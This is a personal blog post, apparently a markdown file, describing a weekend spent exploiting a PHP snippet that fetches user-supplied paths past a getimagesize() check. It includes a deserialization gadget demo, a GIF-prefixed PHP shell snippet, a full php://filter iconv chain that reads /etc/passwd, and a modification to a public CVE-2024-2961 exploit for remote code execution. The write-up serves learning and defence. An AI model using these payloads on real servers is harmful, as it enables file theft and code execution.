@@ -1,0 +1,171 @@
+---
+title: Weekend Destroyed with PHP Streams
+slug: weekend-destroyed-with-php-streams
+date: 2025-01-27 11:13:44.000000000 -05:00
+---
+
+I was going to give this a different name but that would violate the terms of service of the inspiration of this post.  IYKYK. 
+
+This weekend I was taken deep into the darkness that is serialization attacks, gadgets, and rce via iconv.  This was part of a puzzle of sorts.  It boiled down to a challenge to try to exploit the following:
+
+```
+<?php
+
+$data = file_get_contents($_POST['file']);
+
+if (!getimagesize($_POST['file_url'])) {
+    die('bad file');
+} else {
+    file_put_contents("checkmeout.txt", $data);
+?>
+```
+
+It was a little more complicated than this, but that's the crux of it.  At first glance it's clear that this is a problem because we're just retrieving whatever files the user gives us.  Things like '/etc/passwd/', '.env', 'wp-config.php', ... come to mind to try.  The problem is that in the next like getimagesize() is being used and it returns false if PHP doesn't detect it as a valid image file.  
+
+
+<h2 class="bold text-2xl"> Attempt 1, Serialization Attack</h2>
+
+
+Doing a bit of googling lead me to generating [a phar:// files to trigger deserialization](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8).  This would be great because I wouldn't have to worry about the if statement, my code would just execute.  The linked to article does an excellent job of breaking down the specifics but sadly that has all be patched in PHP 8. 
+
+For posterity, the premise of a serialization attack relies on feeding vulnerable system an object in serialized format.  Then, that object is instantiated by deserializing it.  The goal is to find a 'gadget' which is a vulnerable class that has a constructor/destructor or __wakeup() that allows remote code execution.  
+
+Consider the following example:
+
+```
+<?php
+
+ class Vulnerable {
+     public $command;
+
+     function __destruct() {
+            if ($this->command) {
+                system($this->command);
+            }
+     }
+ }
+
+ if (!$argv[1]) {
+     die("Usage: " . $argv[0] . " [serialized data]\n");
+ }
+
+ print_r(unserialize($argv[1]));
+
+```
+
+Under normal execution, it behaves innocently enough:
+
+```
+> php test.php 'a:1:{s:7:"success";b:1;}'
+Array
+(
+    [success] => 1
+)
+```
+
+But if we pass it an object:
+
+```
+> php test.php 'O:10:"Vulnerable":1:{s:7:"command";s:2:"id";}'
+Vulnerable Object
+(
+    [command] => id
+)
+uid=501(jklem) gid=20(staff) groups=20(staff),101(access_bpf),12(everyone)......
+```
+
+Unfortunately none of that was relevant in this case, because the old phar:// deserialization was dead
+
+<h2 class="bold text-2xl"> Attempt 2, Arbitrary File Inclusion</h2>
+
+
+As the code sits, we actually can access any arbitrary image file we want.  So if we were somehow lucky and there was an apache/nginx vulnerability that worked with bad files or the likes, we would be in luck.  That also wasn't the case.  
+
+Thankfully, digging deeper, we see that getimagesize() is a simple function that just parses the header of a file (and gets additional information, but the part that we care about is it has to have a good header).
+
+Consider the following
+
+```
+<?php
+
+ file_put_contents("test.img", "randomtext");
+
+ if (getimagesize("test.img")) {
+     echo "test.img identifies as an image\n";
+ } else {
+     echo "test.img does not identify as an image\n";
+ }
+
+ file_put_contents("test.img", "GIFimagedata");
+ if (getimagesize("test.img")) {
+     echo "test.img identifies as an image\n";
+ } else {
+     echo "test.img does not identify as an image\n";
+ }
+```
+
+You'll notice that "GIFimagedata" is a valid image according to PHP.  According to [this list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) it should be "GIF87a" and "GIF89a" but PHP is cool with just "GIF".
+
+So this means that we can upload all sorts of items such as PHP scripts under the guise of being a GIF.  An example would included:
+
+```
+GIF89a
+<?php
+    system('id');
+?>
+```
+
+However, this doesn't help us when the example is beign written to a .txt file.  Unless the web server is grossly misconfigured, we won't be able to execute any code that way.
+
+<h2 class="bold text-2xl"> WrapWrap</h2>
+
+Next we discover the excellent tool [WrapWrap](https://github.com/ambionics/wrapwrap?tab=readme-ov-file) and there's a deep dive into how it works that's written by the author [here](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix).
+
+Thankfully this guy is much smarter than me.  The logic of using php filter streams makes sense.  And I could see if we could somehow get lucky and find something that the base64 encoded version starts with GIF we would be in business but the odds are low on that.  Instead, he also leverages iconv conversions to inject additional characters into the mix AFTER the file is retrieved.  There's also a writeup [here](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) about
+the genesis of this technique and it relies on the fact that  convert.iconv.UTF8.CSISO2022KR will always prepend a specific set of characters.  And then through some various conversion magic and using base64 to remove characters, you can read a file and arbitrarily append and prepend any data you want with it. 
+
+We were able to leverage `wrapwrap.py /etc/passwd 'GIF89a' '' 10000`.  That gave us this nugget:
+
+```
+php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd
+```
+
+This would fetch /etc/passwd and prepend our magic characters to it.  Viola!  We could trick the system into dumping any arbitrary file we had access to into the text file that we can then retrieve.
+
+Unfortunate, we want RCE.  This would be a good vector if we could find a juicy config file though.
+
+<h2 class="bold text-2xl"> iconv() CVE</h2>
+
+Yet more lovely work by ambionics, there is an official writeup [here](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1) and more tooling available [on github](https://github.com/ambionics/cnext-exploits.git).
+
+I'm still trying to wrap my head around the mechanics of it, but through some sorcery involving a buffer overflow in glibc the iconv api can be abused to cause remote code execution.  Scarily php filters and this cve can be combined to work even if loose file type verification is used.
+
+In cnext-exploit.py you can modify line 60 to include the transformation from wrapwrap that you need:
+
+```
+ path = f"php://filter/convert.base64-encode/resource={path}"
+```
+
+becomes
+
+```
+    path = f"php://filter/convert.base64-encode|convert.iconv.855.UTF7|
+    convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|
+    convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|
+    convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|
+    convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|
+    convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|
+    convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|
+    convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|
+    convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource={path}"
+```
+
+Additionally, you'll want to clean up/remove any data that you had to prepend to the file for the rest of it to work.
+
+
+<h2 class="bold text-2xl"> Done</h2>
+Previously, we had to rely on actual inclusion of files to get execution.  This could be done through either somehow uploading a malicious file or possibly using log poisoning and then including the file.  However, with this, so long as we can arbitrarily include a file and then see that content, remote code execution is possible.
+
+As mentioned, chasing down this particular puzzle ended up killing a weekend but during that time I learned a lot of scary things that can be done with poorly written PHP.  The key takeaway here is that you should NEVER trust user input and you should strive to make sure even the smallest thing is performed as securely as possible because you never know what can be chained together to become a big deal.
+
+
